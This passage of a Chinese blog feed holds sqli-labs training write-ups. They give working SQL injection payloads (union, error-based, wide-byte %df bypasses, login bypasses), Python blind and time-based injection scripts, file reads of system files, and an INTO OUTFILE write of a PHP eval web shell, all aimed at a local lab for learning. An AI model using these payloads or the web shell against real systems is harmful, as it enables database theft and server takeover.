class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-33/?id=-1%df%27 union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><p>这里面怎么防范呢？<br>使用addslashes(),我们需要将mysql_query 设置为<code>binary</code> 的方式，才能防御此漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</span><br></pre></td></tr></table></figure><p>这时候我想到了我当时做的一个题目好像utf8_general_ci可以用编码去绕过，但是那个是在mysql服务端起作用的</p><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>这一题换了post的模式但是利用方法还是有点不同的，<br>本关是post 型的注入漏洞，同样的也是将post 过来的内容进行了‘ \ 的处理。由上面的例子可以看到我们的方法就是将过滤函数添加的\ 给吃掉。而get 型的方式我们是以url 形式提交的，因此数据会通过URLencode，如何将方法用在post 型的注入当中，我们此处介绍一个新的方法。将utf-8 转换为utf-16 或utf-32，例如将<code>‘</code> 转为utf-16 为<code>♦&#39;</code>  。我们就<br>可以利用这个方式进行尝试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=♦&apos; or 1=1#&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>但也可以直接用%df绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=ade3&amp;submit=Submit</span><br></pre></td></tr></table></figure><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>这一题水，根本没有使用任何引号不需要闭合，它的转义也是多余的，直接报错就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-35/?id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p>这一关里面用了<code>mysql_real_escape_string</code>函数去进行过滤<br>是因mysql 我们并没有设置成gbk，所以<code>mysql_real_escape_string()</code>依旧能够被突破。方法<br>和上述是一样的。<br>用utf-16绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%ef%bf%bd%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>用%df去绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%df%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p>有报错输出选择报错注入，就是post方式的宽字节<br>uname=admin%df’ and updatexml(1,concat(0x7e,database(),0x7e),1)# &amp;passwd=admin&amp;submit=Submit</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>SQLi-LABS(Adv)这一部分的题目完结，这一部分主要是对输入的数据进行了过滤和防护，但是都过滤得不全，<br>还是会存在多种绕过的方法，这一部分学到了新的知识，就是用utf-16编码绕过宽字节的那一部分内容，其实这里的宽字节前提条件是需要客户端里面设置了gbk，服务端跟过程没有设置同样的编码导致的，所以开发的时候得注意，另外的话这里边的二次注入的题目也是很值得推敲的，也学到了新知识，就是服务器两层架构以及http参数污染的应用，有点意思。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-23&quot;&gt;&lt;a href=&quot;#Less-23&quot; class=&quot;headerlink&quot; title=&quot;Less-23&quot;&gt;&lt;/a&gt;Less-23&lt;/h3&gt;&lt;p&gt;从这里开始应该是有做了防护，我们可以边看源代码练习代码审计，一边学习各种过waf的技巧了
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(一)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-1/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-1/</id>
    <published>2018-08-29T12:01:04.000Z</published>
    <updated>2018-08-29T12:10:13.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近啊先自己SQL注入确实不行，我只能拿出sql注入的基础部分来练练收了，这个实验环境是sqlilabs<a id="more"></a></p><p>一些前置知识<br>系统函数<br>介绍几个常用函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br></pre></td></tr></table></figure><p>字符串连接函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure><p>一般用于尝试的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ps:--+可以用#替换，url 提交过程中Url 编码后的#为%23</span><br><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>输入?id=1’出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>凡是出现这种有回显的报错是感觉是最好做的注入</p><p>常规步骤，<code>暴库-&gt;爆表-&gt;爆列</code><br>这里我们是多写了个单引号导致报错，我们可以从报错看得出来这里是单引号括着id参数<br>所以我们闭合单引号<br>构造我们需要的东西<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27%23</code> 回显正常，说明猜测成功</p><p>去后台看一下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>是这样子的，没有任何过滤</p><p>然后开始用order by去猜列数<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27 order by 3%23</code>  得到表中应该是三列(用二分法去慢慢测)</p><p>然后开始用union select去回显某一列的东西<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=-1%27</code> union select 1,2,3%23<br>这里我们需要把第一句话弄成结果为空才能显示后面一句话的内容，这里我选择id=-1，然后的话就可以回显2和3,后面就可以利用这两列回显你想要的东西了</p><p>下面我们就开始要用mysql里面自带的information_schema表了<br>猜表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>猜列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&apos;users&apos;%23</span><br></pre></td></tr></table></figure><p>才猜对应的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,concat_ws(&apos;%23&apos;,username,password)%20from users limit 0,1%23</span><br></pre></td></tr></table></figure><p>这一句话只能猜一行，所以要想看其他行的内容就必须要刷一下limit的内容了</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>很无聊，看一下源代码什么防御都没有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=1 order by 5</span><br></pre></td></tr></table></figure><p>测试得到3列，然后开始闭合，其实这一题直接注释了就好</p><p>直接上语句<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=-1 union select 1,2,3#</span><br></pre></td></tr></table></figure><p>这时候想测什么都可以了</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>输入?id=1’出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>可以猜测这里应该是一个单引号+括号闭合，测试一下对不对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=1&apos;) %23</span><br></pre></td></tr></table></figure><p>成功回显</p><p>再看看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>果然如此</p><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=-1&apos;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>尝试?id=1’单引号没有报错<br>尝试一下”,发现出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>猜测是<code>&quot;+）</code>的组合<br>闭合一下试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=1&quot;)%23</span><br></pre></td></tr></table></figure><p>成功回显<br>再看看源代码果然是这样<br>接下来就是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>根据<code>You are in</code>的有无来判断正确<br>输入id=1’出现报错回显<br>猜测是单引号的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5/?id=1%27%23</span><br></pre></td></tr></table></figure><p>尝试闭合一下出现回显，这个题目有两种做法，一种是直接尝试盲注，另一种是报错注入<br>首先来一个报错注入的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5?id=1&apos; and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>然后再来一个盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"><span class="comment">#url = "http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>输入?id=1’没有任何反应，双引号闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot;%23</span><br></pre></td></tr></table></figure><p>直接报错即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 4,1),0x7e),1)%23</span><br></pre></td></tr></table></figure><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>是测试写文件的功能<br>直接输入单引号出现错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p>这里得提及一下如果要读取以及写文件的话必须得需要权限，这里我借鉴了一部分内容<br>导入导出相关操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file(file_name)：读取文件并返回该文件的内容作为一个字符串。</span><br></pre></td></tr></table></figure><p>使用条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A.必须有权限读取并且文件可读</span><br><span class="line"></span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常，说明具有读写权限。如果返回错误，则说明管理员给数据库降权。</span><br><span class="line"></span><br><span class="line">B.欲读取文件必须在服务器上。</span><br><span class="line">C.必须指定文件完整的路径</span><br><span class="line">D.欲读取文件必须小于max_allowed_packet。</span><br></pre></td></tr></table></figure><p>实际应用时，文件读取权限是最难满足的，我们有两个难点需要解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.绝对物理路径</span><br><span class="line">2.构造有效的畸形语句(报错爆出绝对路径)</span><br></pre></td></tr></table></figure></p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))</span><br><span class="line">利用hex()将文件导出来，特别是smb文件</span><br><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">explain：c:/boot.ini的十六进制是0x633s2f626f6f742e696e69</span><br><span class="line">-1 union select 1,1,1,load_file(C:\\boot.ini)</span><br><span class="line">explain：路径里的/用\\代替</span><br><span class="line">load data file导入数据库</span><br><span class="line">略。</span><br><span class="line">导入到文件中</span><br><span class="line">SELECT INTO OUTFILE ‘file_name’,具体参阅其他文章。</span><br><span class="line">file_name 不能是一个已经存在的文件。</span><br></pre></td></tr></table></figure><p>从源代码里面可以发现是要闭合)的，所以我们就可以这样去写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; into outfile &apos;D:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\1.php&apos; --+</span><br></pre></td></tr></table></figure><p>连接成功<br><a href="https://imgchr.com/i/PXe8Ig" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXe8Ig.md.png" alt="PXe8Ig.md.png"></a></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>这一题源代码里面将有关报错信息全都注释了只能用盲注<br><a href="https://imgchr.com/i/PXetRs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXetRs.md.png" alt="PXetRs.md.png"></a><br>先测试发现还是直接一个单号然后加一个注释就可以坐后面的事情了<br>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.102/sqlilabs/Less-8/?id=1' and ascii(substr((select database()),&#123;_&#125;,1))</span></span><br><span class="line"><span class="string">&gt;&#123;__&#125; %23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    max = <span class="number">127</span></span><br><span class="line">    min = <span class="number">65</span></span><br><span class="line">    <span class="keyword">while</span> abs(max-min)&gt;<span class="number">1</span>:</span><br><span class="line">    mid = (max+min)//<span class="number">2</span></span><br><span class="line">    payload = url.format(_=i,__=mid)</span><br><span class="line">    ans = requests.get(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">    min = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    max = mid</span><br><span class="line">    database = database + chr(max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>这是一个时间盲注的题目<br>直接单引号闭合加个注释其实就ok了，这里就直接给个爆数据库的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-8/?id=1'and if(ascii(substr(database(),&#123;_&#125;,1))=&#123;__&#125;,1,sleep(3))--+'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()-start &gt;<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            database += chr(j)</span><br><span class="line">            <span class="keyword">print</span> database</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>也是一个时间盲注题目，不过这一题是双引号闭合，把上面的脚本改为双引号就好</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>是一个post表格的界面<br>上来就尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>再尝试Less-11一部分内容，发现不行，没有报错信息<br>尝试双引号<br>出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your MySQL server version for the right syntax to use near &apos;&quot;)</span><br></pre></td></tr></table></figure><p>应该是有一个括号的<br>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1 #</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><p>立即过</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>上一题的单引号版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这一体的注入点在password上，这也提醒了我们，注入点不一定是在第一个输入框内还有可能是第二输入框呢！<br>我们也可以从源代码的角度去分析，因为源代码写了个check函数去检查username而password反而漏了写<br>对应的password我们可以用报错注入去实现，用单引号闭合password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;user&apos;),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆详细信息<br>这时候输入这一句话的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select username from users),0x7e),1)#</span><br></pre></td></tr></table></figure><p>会出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</span><br></pre></td></tr></table></figure><p>这是mysql自身的问题不能同时对一个表又select又update，所以我们得构造另外一个表去子查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and updatexml(1,concat(0x7e,(select username from (select username  from users)b limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure><p>介绍一下里面的过滤函数，其他两个很熟悉就不介绍了<br><code>mysql_real_escape_string()</code><br>函数转义SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>一进去就显示ip，可能是http头注入<br>查看源代码我们是要登录进去后才能注入，利用的是insert的那一部分语句<br>先在user-agent那里输入1’ 会出现报错<br><code>MySQL server version for the right syntax to use near &#39;127.0.0.1&#39;, 